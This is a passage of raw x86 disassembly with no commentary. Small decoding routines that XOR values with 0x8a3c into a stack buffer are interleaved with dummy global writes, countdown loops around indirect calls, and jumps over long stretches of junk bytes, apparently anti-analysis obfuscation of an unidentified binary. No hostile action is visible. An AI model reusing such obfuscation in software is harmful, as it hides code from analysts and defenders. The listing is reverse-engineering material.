  410a08:	shl    DWORD PTR [ecx+ebx*4+0x5e],0xd8
  410a0d:	cs and eax,0xfd5cf2ba
  410a13:	push   ecx
  410a14:	pop    ecx
  410a15:	out    dx,al
  410a16:	inc    esi
  410a17:	ret    
  410a18:	ja     0x410a3c
  410a1a:	adc    al,0xf2
  410a1c:	adc    DWORD PTR [eax],edx
  410a1e:	mov    esp,ebx
  410a20:	popa   
  410a21:	nop
  410a22:	push   cs
  410a23:	test   BYTE PTR [ebx+0x10],0xd2
  410a27:	fmul   DWORD PTR [ebx]
  410a29:	fmul   DWORD PTR [edx]
  410a2b:	push   ebp
  410a2c:	jbe    0x410a67
  410a2e:	inc    ebx
  410a2f:	xchg   ebx,eax
  410a30:	adc    eax,0x96bd2e76
  410a35:	data16 stc 
  410a37:	mov    esi,0xf78a0de0
  410a3c:	outs   dx,DWORD PTR ds:[esi]
  410a3d:	xchg   DWORD PTR [ebp+0x4b96d931],edi
  410a43:	jle    0x4109cc
  410a45:	add    esi,DWORD PTR [eax-0x45]
  410a48:	adc    BYTE PTR [esi+0x57],dh
  410a4b:	sub    cl,BYTE PTR [esi]
  410a4d:	push   ebp
  410a4e:	div    DWORD PTR [ebx+eiz*8-0x4737b6e7]
  410a55:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4336e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4336bf
  410a95:	sbb    eax,DWORD PTR ds:0x433743
  410a9b:	mov    ds:0x4336bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4336b7,0x4336ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4336af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433667,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4336f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43362b,0x433637
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43362b
  410b09:	sbb    DWORD PTR ds:0x433673,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	scas   eax,DWORD PTR es:[edi]
  410b21:	sub    eax,0x460d9db3
  410b26:	jle    0x410ba6
  410b28:	icebp  
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b01
  410b2d:	in     al,0xa5
  410b2f:	cmp    BYTE PTR [ebx+0x36],ch
  410b32:	push   ds
  410b33:	sub    BYTE PTR [esi],al
  410b35:	aas    
  410b36:	hlt    
  410b37:	sub    eax,0x6fc55afb
  410b3c:	lea    ebx,[esp+ebp*8]
  410b3f:	jmp    0xdbbb:0x608cf117
  410b46:	jmp    0x410b2b
  410b48:	test   al,0xe6
  410b4b:	sub    DWORD PTR [edi+edx*2+0x22e2af35],edx
  410b52:	push   eax
  410b53:	or     eax,0x645d4af0
  410b58:	cwde   
  410b59:	or     eax,0xb2b09512
  410b5e:	(bad)  
  410b5f:	jmp    FWORD PTR [edx-0x45326b32]
  410b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b66:	dec    eax
  410b67:	or     DWORD PTR [esi+ecx*4-0x2a78e689],edi
  410b6e:	add    al,0x8f
  410b70:	pop    ecx
  410b71:	retf   
  410b72:	xchg   DWORD PTR [eax+ebp*2-0x6f],edi
  410b76:	(bad)  
  410b77:	stc    
  410b78:	inc    ebx
  410b79:	xchg   edi,eax
  410b7a:	(bad)  
  410b7b:	fild   DWORD PTR [ecx+0x5c]
  410b7e:	mul    esi
  410b80:	xor    al,0xa4
  410b82:	lsl    edi,WORD PTR [ebx-0x6]
  410b86:	rol    BYTE PTR [eax+0x7924de76],1
  410b8c:	(bad)  
  410b8d:	xor    BYTE PTR [ecx],ch
  410b8f:	mov    gs,WORD PTR [edx-0x1c03f7a8]
  410b95:	daa    
  410b96:	imul   ebx,DWORD PTR ss:[edi-0x7344e502],0x4a
  410b9e:	bound  esp,QWORD PTR [eax+eax*2]
  410ba1:	xor    DWORD PTR [ebp-0x11],eax
  410ba4:	test   al,0x92
  410ba6:	stos   DWORD PTR es:[edi],eax
  410ba7:	add    edi,edx
  410ba9:	mov    ecx,0x887de77e
  410bae:	pop    edi
  410baf:	icebp  
  410bb0:	mov    ebx,edx
  410bb2:	jp     0x410c06
  410bb4:	fcomp  DWORD PTR [edi]
  410bb6:	leave  
  410bb7:	and    ebp,0xffffffa4
  410bba:	jns    0x410b63
  410bbc:	mov    ah,0x8f
  410bbe:	dec    eax
  410bbf:	test   DWORD PTR [edi+0x57e4d352],edx
  410bc5:	lds    eax,FWORD PTR [edi+esi*1]
  410bc8:	jb     0x410b65
  410bca:	test   DWORD PTR [ecx+0x1c],ebx
  410bcd:	ss cwde 
  410bcf:	mov    dh,0x6c
  410bd1:	xchg   DWORD PTR [esi],eax
  410bd3:	fstp   st(6)
  410bd5:	stc    
  410bd6:	pop    eax
  410bd7:	pop    eax
  410bd8:	(bad)  
  410bd9:	jmp    0x410c4e
  410bdb:	out    dx,eax
  410bdc:	rcr    BYTE PTR [ecx-0x3a],1
  410bdf:	cmp    ecx,esi
  410be1:	ins    BYTE PTR es:[edi],dx
  410be2:	dec    ebx
  410be3:	adc    DWORD PTR [ebx+0x3df115b2],ebp
  410be9:	push   es
  410bea:	sbb    bl,BYTE PTR [esi]
  410bec:	add    DWORD PTR [edx],edi
  410bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bef:	call   FWORD PTR [ebp-0x13a03380]
  410bf5:	retf   0x496f
  410bf8:	sub    DWORD PTR [ebx],0xcf560d13
  410bfe:	jnp    0x410bcc
  410c00:	idiv   DWORD PTR [ebx-0x3a788b29]
  410c06:	imul   eax,esp,0x3d
  410c09:	add    cl,dl
  410c0b:	push   eax
  410c0c:	inc    ecx
  410c0d:	sbb    BYTE PTR [ebx+0x2a],0xe3
  410c11:	dec    edi
  410c12:	add    eax,0x6edde3ac
  410c17:	lock push 0x5b
  410c1a:	xchg   DWORD PTR [eax],eax
  410c1c:	iret   
  410c1d:	jnp    0x410c57
  410c1f:	dec    esi
  410c20:	adc    al,0xf9
  410c22:	popf   
  410c23:	cwde   
  410c24:	inc    DWORD PTR [edi+0x6f]
  410c27:	mov    bl,0x60
  410c29:	push   ds
  410c2a:	add    BYTE PTR [ebp-0x22b6bc4b],ch
  410c30:	dec    ebx
  410c31:	mov    eax,DWORD PTR [edx]
  410c33:	sti    
  410c34:	inc    edx
  410c35:	and    cl,dl
  410c37:	daa    
  410c38:	adc    DWORD PTR [edx+0x12],0xaf4b7a7c
  410c3f:	xchg   edx,eax
  410c40:	fcom   QWORD PTR [edi]
  410c42:	sub    eax,0x4d30d09d
  410c47:	scas   al,BYTE PTR es:[edi]
  410c48:	xchg   DWORD PTR [ebx+edx*4-0x5d3db702],eax
  410c4f:	xor    al,0xb2
  410c51:	bound  esp,QWORD PTR [edx-0x65]
  410c54:	cli    
  410c55:	xchg   ebx,eax
  410c56:	or     eax,0xd8b0940b
  410c5b:	scas   al,BYTE PTR es:[edi]
  410c5c:	push   edx
  410c5d:	dec    edx
  410c5e:	sub    esp,DWORD PTR [ebx]
  410c60:	or     edx,ebp
  410c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c63:	mov    dl,0x9b
  410c65:	or     esp,DWORD PTR [esi-0x2b]
  410c68:	push   ss
  410c69:	dec    ebp
  410c6a:	xchg   edx,eax
  410c6b:	aaa    
  410c6c:	pop    edx
  410c6d:	sbb    BYTE PTR [edx-0x280c45d6],bh
  410c73:	mov    DWORD PTR [edi],esi
  410c75:	popa   
  410c76:	sbb    BYTE PTR [esi-0x5c],bh
  410c79:	js     0x410cbb
  410c7b:	or     ebx,DWORD PTR [edi]
  410c7d:	clc    
  410c7e:	out    dx,al
  410c7f:	lds    ebx,FWORD PTR [ebx-0x78f52457]
  410c85:	cs dec edi
  410c87:	js     0x410c5a
  410c89:	push   ecx
  410c8a:	jb     0x410c42
  410c8c:	inc    esi
  410c8d:	in     al,0xdf
  410c8f:	push   edx
  410c90:	mov    esp,0x3ee15bcb
  410c95:	push   ebp
  410c96:	or     DWORD PTR [edx-0x406bbad8],ecx
  410c9c:	adc    eax,0x36561ad7
  410ca1:	dec    ebp
  410ca2:	push   ds
  410ca3:	ins    DWORD PTR es:[edi],dx
  410ca4:	cwde   
  410ca5:	sub    al,0xc8
  410ca7:	mov    esp,0xc7625117
  410cac:	inc    ebp
  410cad:	clc    
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4336ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43362f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43362f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43362f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43366b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43367f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43362f
  410d20:	add    eax,DWORD PTR ds:0x433703
  410d26:	mov    ds:0x43362f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43373f,0x17
  410d38:	cmp    DWORD PTR ds:0x43373f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43373f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43373f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43373f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43373f,eax
  410d84:	mov    eax,ds:0x43373f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43373f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433623,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43373b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4336b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    ah,dh
  410dcd:	and    DWORD PTR ds:0x7e478cff,edx
  410dd3:	jle    0x410dc6
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410e34
  410dd9:	stc    
  410dda:	or     eax,0xd3f23aeb
  410ddf:	jge    0x410dc9
  410de1:	push   ecx
  410de2:	mov    ecx,0x867e9090
  410de7:	inc    edi
  410de8:	pop    edi
  410de9:	mov    edx,0x211ebb97
  410dee:	cmc    
  410def:	xor    ch,BYTE PTR [ecx+edx*1+0x2f998194]
  410df6:	ja     0x410e64
  410df8:	sub    DWORD PTR [edx],esp
  410dfa:	in     al,0x6b
  410dfc:	test   eax,0xe7a840e4
  410e01:	or     al,0x56
  410e03:	popf   
  410e04:	sbb    edi,edx
  410e06:	loop   0x410e62
  410e08:	mov    ecx,0x746a19f
  410e0d:	lahf   
  410e0e:	addr16 call 0x2191:0xc25c75be
  410e16:	inc    esi
  410e17:	inc    DWORD PTR [ecx]
  410e19:	lahf   
  410e1a:	cmp    eax,0x2dd7b705
  410e1f:	sbb    ch,BYTE PTR [edi]
  410e21:	or     BYTE PTR [ecx],ch
  410e23:	sbb    BYTE PTR [edi-0x7db336ae],ch
  410e29:	rol    BYTE PTR [ebx],cl
  410e2b:	aam    0x41
  410e2d:	adc    DWORD PTR [ecx-0x29dae15c],esp
  410e33:	or     BYTE PTR [ecx+0x434b68d3],dh
  410e39:	icebp  
  410e3a:	xor    ch,dl
  410e3c:	inc    esp
  410e3d:	pop    ss
  410e3e:	sar    edx,cl
  410e40:	dec    esp
  410e41:	sub    bh,BYTE PTR [ecx+0x40a1a6c1]
  410e47:	mov    ds,WORD PTR [edi+ebp*1]
  410e4a:	add    ch,BYTE PTR [ebp+ebp*4-0xef1f292]
  410e51:	adc    BYTE PTR [ebx+0x6e3b5d0b],ah
  410e57:	or     eax,0x7e14b8da
  410e5c:	psllq  mm1,mm6
  410e5f:	or     al,0xb4
  410e61:	and    bl,BYTE PTR [bx-0x4d]
  410e65:	push   es
  410e66:	lods   eax,DWORD PTR ds:[esi]
  410e67:	call   0xd0efc89d
  410e6c:	xor    edx,DWORD PTR [ebp+0xd56471e]
  410e72:	pushf  
  410e73:	push   esp
  410e74:	xor    DWORD PTR [esi-0x1f753172],esp
  410e7a:	dec    esp
  410e7b:	xor    BYTE PTR [esi],cl
  410e7d:	or     al,0xe8
  410e7f:	mov    ah,0x69
  410e81:	mov    bl,0xe3
  410e83:	int3   
  410e84:	addr16 pop eax
  410e86:	xlat   BYTE PTR ds:[ebx]
  410e87:	pop    ss
  410e88:	enter  0xfd04,0x6e
  410e8c:	jbe    0x410eff
  410e8e:	fwait
  410e8f:	call   0xdb68cc56
  410e94:	sbb    DWORD PTR [edi],0xffffffc4
  410e97:	shr    BYTE PTR [ebp+0x53143cea],0x25
  410e9e:	sbb    al,0xbd
  410ea0:	js     0x410ea1
  410ea2:	in     eax,dx
  410ea3:	ficom  WORD PTR [eax-0x29]
  410ea6:	sahf   
  410ea7:	addr16 inc ecx
  410ea9:	imul   edx,DWORD PTR [esi-0x3d],0xffffffb9
  410ead:	pop    edx
  410eae:	add    ch,BYTE PTR [edx-0x14]
  410eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eb2:	push   0x5d
  410eb4:	out    0xea,al
  410eb6:	lock push cs
  410eb8:	xchg   edi,eax
  410eb9:	lock adc eax,0xd613ad9a
  410ebf:	pop    ecx
  410ec0:	icebp  
  410ec1:	clc    
  410ec2:	std    
  410ec3:	push   eax
  410ec4:	dec    ebp
  410ec5:	mov    ebx,DWORD PTR [edx-0x7f40f26c]
  410ecb:	mov    esp,0xe785f8b6
  410ed0:	xor    BYTE PTR [edx+0x30],bh
  410ed3:	(bad)  
  410ed4:	push   edi
  410ed5:	lea    edx,[esi]
  410ed7:	je     0x410ee3
  410ed9:	das    
  410eda:	mov    dh,0xe1
  410edc:	xchg   edi,eax
  410edd:	sbb    al,0x0
  410edf:	xchg   ecx,eax
  410ee0:	sbb    eax,DWORD PTR [edx+ecx*4-0x5a9608bf]
  410ee7:	pop    edi
  410ee8:	jb     0x410ee7
  410eea:	mov    eax,ds:0xd7a076ef
  410eef:	lods   al,BYTE PTR ds:[esi]
  410ef0:	add    ah,ch
  410ef2:	iret   
  410ef3:	in     al,0xcf
  410ef5:	mov    BYTE PTR [edi-0x1b],0x91
  410ef9:	mov    al,0x72
  410efb:	loop   0x410eb2
  410efd:	adc    al,0x81
  410eff:	ins    DWORD PTR es:[edi],dx
  410f00:	mov    edx,0x66591168
  410f05:	or     edx,DWORD PTR [edi+0x30]
  410f08:	mov    edx,0x8086cc1f
  410f0d:	jns    0x410ee1
  410f0f:	pop    ecx
  410f10:	mov    ecx,0x3989c736
  410f15:	jne    0x410f6d
  410f17:	mov    edi,0x6afdabb7
  410f1c:	jle    0x410f2c
  410f1e:	aad    0x31
  410f20:	push   es
  410f21:	add    ebp,ebp
  410f23:	popf   
  410f24:	pop    esi
  410f25:	xchg   ebp,eax
  410f26:	aam    0xcc
  410f28:	in     al,dx
  410f29:	(bad)  
  410f2a:	add    dl,BYTE PTR gs:[ebx+0x2c]
  410f2e:	adc    ecx,ebx
  410f30:	or     esp,DWORD PTR [eax+ecx*8]
  410f33:	pop    edi
  410f34:	xor    eax,0xa5a6bd3a
  410f39:	pop    ds
  410f3a:	dec    ecx
  410f3b:	jo     0x410ecc
  410f3d:	jnp    0x410f15
  410f3f:	(bad)  
  410f40:	sub    DWORD PTR [edx-0x555a3f55],ebp
  410f46:	mov    dh,0x82
  410f48:	pop    es
  410f49:	mov    ecx,cs
  410f4b:	or     DWORD PTR [edi-0x1f],ecx
  410f4e:	es dec eax
  410f50:	dec    edi
  410f51:	daa    
  410f52:	ds inc esi
  410f54:	aas    
  410f55:	mov    bl,0xc0
  410f57:	je     0x4111b4
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43372f
  410f65:	sub    DWORD PTR ds:0x433733,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43367f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43367f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43367f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4336b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43367f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43367f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43367f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43367f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43367f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	jle    0x410f7c
  410ffa:	dec    ebx
  410ffb:	mov    esi,0x7e7e450f
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x411038
  411005:	fcom   QWORD PTR [esi+0x4b4dbd51]
  41100b:	sar    BYTE PTR [edx+0x69c73a6b],0x86
  411012:	push   edx
  411013:	jle    0x411037
  411015:	into   
  411016:	dec    ecx
  411017:	mov    al,0xdf
  411019:	sub    ecx,DWORD PTR [edx]
  41101b:	(bad)  
  41101c:	mov    edx,0x1db1d3c3
  411021:	je     0x410fc2
  411023:	sar    DWORD PTR [edx+0x3a8ba120],cl
  411029:	add    dh,BYTE PTR [ecx-0x1b16ce86]
  41102f:	pushf  
  411030:	jl     0x411074
  411032:	inc    esi
  411033:	sbb    DWORD PTR [edi+edi*1+0x2e],0x910b2a4
  41103b:	inc    esp
  41103c:	add    DWORD PTR [edx+eiz*1+0x798008b4],0x34
  411044:	rcl    BYTE PTR [ecx],cl
  411046:	inc    ebp
  411047:	std    
  411048:	shl    BYTE PTR [edx-0x228eda3d],1
  41104e:	arpl   si,si
  411050:	and    eax,0x365397ce
  411055:	cmp    DWORD PTR [ebp-0x498c2637],edi
  41105b:	je     0x4110c7
  41105d:	add    BYTE PTR [ebp-0x69],ah
  411060:	sbb    ebp,edi
  411062:	adc    DWORD PTR [edi-0xf],esi
  411065:	inc    ebx
  411066:	pop    edx
  411067:	dec    edi
  411068:	sub    al,0xd7
  41106a:	inc    ebx
  41106b:	(bad)  
  41106c:	dec    esp
  41106d:	outs   dx,DWORD PTR ds:[esi]
  41106e:	test   al,0xc0
  411070:	(bad)  
  411071:	les    esi,FWORD PTR [edx]
  411073:	mov    ds:0xd80dd6d0,eax
  411078:	inc    edx
  411079:	push   edx
  41107a:	bound  edx,QWORD PTR [ecx+edi*1+0x79facd52]
  411081:	fist   WORD PTR [eax-0x42]
  411084:	inc    ebp
  411085:	sbb    eax,0x6adf797b
  41108a:	call   0xa447:0x55893123
  411091:	jbe    0x41104f
  411093:	(bad)  
  411094:	(bad)  
  411095:	jns    0x4110c3
  411097:	call   0xed211383
  41109c:	imul   ecx,DWORD PTR [eax-0x26d48dad],0xfffffffb
  4110a3:	add    al,0x64
  4110a5:	add    al,BYTE PTR [ecx-0x27c95acd]
  4110ab:	bound  edi,QWORD PTR [edx+0x10]
  4110ae:	dec    edi
  4110af:	fisttp DWORD PTR [ebx]
  4110b1:	call   FWORD PTR [ecx+0x7e2d0973]
  4110b7:	xchg   edi,eax
  4110b8:	lds    edi,FWORD PTR [ebp+0x6d]
  4110bb:	cli    
  4110bc:	pusha  
  4110bd:	(bad)  
  4110be:	sub    DWORD PTR [ebx+0x49],edx
  4110c1:	adc    al,0xaa
  4110c3:	push   ebx
  4110c4:	stc    
  4110c5:	popf   
  4110c6:	push   ds
  4110c7:	imul   eax,DWORD PTR [ecx+0xc],0xd6616a9e
  4110ce:	int3   
  4110cf:	out    dx,al
  4110d0:	out    0x70,al
  4110d2:	aaa    
  4110d3:	lahf   
  4110d4:	mov    DWORD PTR [esi+0x6e6c1278],ecx
  4110da:	(bad)  
  4110db:	aas    
  4110dc:	test   DWORD PTR [ebx],esp
  4110de:	hlt    
  4110df:	dec    edi
  4110e0:	sti    
  4110e1:	sbb    DWORD PTR [eax+0x74],ebp
  4110e4:	fsubr  QWORD PTR [ecx]
  4110e6:	push   0xffffffaa
  4110e8:	repnz cdq 
  4110ea:	xchg   ebp,eax
  4110eb:	inc    ebx
  4110ec:	iret   
  4110ed:	ror    BYTE PTR [esi],0x35
  4110f0:	std    
  4110f1:	pop    eax
  4110f2:	test   edi,edi
  4110f4:	push   esp
  4110f5:	push   cs
  4110f6:	aam    0x1b
  4110f8:	cmp    edi,DWORD PTR [esi]
  4110fa:	xor    eax,DWORD PTR [edx+0xd62e573]
  411100:	lds    esp,FWORD PTR ds:0xf6db08ce
  411106:	xchg   esi,eax
  411107:	mov    esp,0x3c978741
  41110c:	push   es
  41110d:	inc    ebp
  41110e:	or     eax,0x1f8ce479
  411113:	js     0x41112b
  411115:	jmp    0x378b:0x91c1069e
  41111c:	sar    BYTE PTR ds:0xc017f6d6,cl
  411122:	fs jne 0x41112b
  411125:	jmp    0x2774092b
  41112a:	rcl    DWORD PTR [ebp+ebx*2+0x102fee9c],1
  411131:	sub    eax,0x6687e66c
  411136:	push   ebp
  411137:	xor    al,0x2
  411139:	sub    ah,0x41
  41113c:	ret    0xf3b3
  41113f:	(bad)  [esi+ebx*2-0x24c365a7]
  411146:	inc    ecx
  411147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411148:	add    al,0xf
  41114a:	dec    esi
  41114b:	pusha  
  41114c:	pop    ds
  41114d:	dec    edx
  41114e:	nop
  41114f:	ret    
  411150:	mov    ah,0x37
  411152:	(bad)  
  411153:	mov    esi,0x851f484
  411158:	xor    ebx,DWORD PTR [edx+0x3f]
  41115b:	inc    ecx
  41115c:	jge    0x41110c
  41115e:	xchg   edi,eax
  41115f:	in     al,dx
  411160:	daa    
  411161:	inc    ebx
  411162:	xor    eax,0x3b01c8b8
  411167:	push   cs
  411168:	cmp    DWORD PTR [edi],eax
  41116a:	data16 out 0xe1,al
  41116d:	jbe    0x41113d
  41116f:	sbb    al,0x6c
  411171:	jne    0x41114f
  411173:	mov    ch,0x17
  411175:	retf   0x80f1
  411178:	not    BYTE PTR [esp+edi*2+0x26]
  41117c:	cmp    ebp,esi
  41117e:	mov    ds:0xe3d430db,eax
  411183:	mov    edi,0x3b02
  411188:	add    ax,di
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0xd1dabba7
  4111f1:	lock and ah,0x8e
  4111f5:	inc    edx
  4111f6:	jle    0x411276
  4111f8:	icebp  
  4111f9:	jg     0x411279
  4111fb:	jle    0x4111c3
  4111fd:	imul   ebp,DWORD PTR [ecx+0x7d],0x1662807
  411204:	icebp  
  411205:	jne    0x4111c4
  411207:	fnstcw WORD PTR [esi]
  411209:	xor    BYTE PTR ss:[ebp+0x58],dh
  41120d:	fdivr  QWORD PTR [eax-0x5c]
  411211:	leave  
  411212:	pop    esp
  411213:	xor    eax,0x5da7050a
  411218:	call   0xdb1d7662
  41121d:	and    DWORD PTR [eax+0x73],esp
  411220:	(bad)  
  411221:	ficomp WORD PTR [ebp-0x7d5ce341]
  411227:	stc    
  411228:	dec    BYTE PTR [edi+0x7480bf3e]
  41122e:	push   cs
  41122f:	ficomp WORD PTR [esi-0x29b171c1]
  411235:	jl     0x41124b
  411237:	sbb    ch,cl
  411239:	arpl   WORD PTR ds:0x7d353b1a,cx
  41123f:	les    ecx,FWORD PTR [eax-0x42]
  411242:	iret   
  411243:	inc    eax
  411244:	pushf  
  411245:	cmc    
  411246:	out    dx,al
  411247:	std    
  411248:	add    ecx,edi
  41124a:	jg     0x4112af
  41124c:	pop    edx
  41124d:	loope  0x411207
  41124f:	aam    0x36
  411251:	sbb    al,0xf3
  411253:	jg     0x411206
  411255:	repnz bound ebx,QWORD PTR [eax+0x7d3b8deb]
  41125c:	jmp    0x903815ff
  411261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411262:	outs   dx,DWORD PTR ds:[esi]
  411263:	mov    eax,0xd1ba18e9
  411268:	jmp    0x5769:0xc95b7899
  41126f:	scas   al,BYTE PTR es:[edi]
  411270:	loop   0x4111f6
  411272:	daa    
  411273:	adc    BYTE PTR [esi],ch
  411275:	adc    cl,0xa7
  411278:	sahf   
  411279:	jmp    0x53db:0x54739c12
  411280:	jmp    0x93b1:0x9f048996
  411287:	jmp    0xfbc1:0x448f1086
  41128e:	ror    esi,0xdf
  411291:	loop   0x41121f
  411293:	cmp    bl,BYTE PTR [edi-0x1caaa27b]
  411299:	(bad)  
  41129a:	pop    edi
  41129b:	das    
  41129c:	lea    ebx,[ebp+0x54afb85a]
  4112a2:	push   0xc6f82312
  4112a7:	xor    BYTE PTR [edi+0x4dd801f1],dl
  4112ad:	dec    edi
  4112ae:	fdivr  st(1),st
  4112b0:	push   ss
  4112b1:	mov    eax,ds:0x4e47072
  4112b6:	bound  ebp,QWORD PTR [edi]
  4112b8:	arpl   bp,dx
  4112ba:	icebp  
  4112bb:	add    eax,DWORD PTR [ebp-0x2e1d56a8]
  4112c1:	ins    BYTE PTR es:[edi],dx
  4112c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
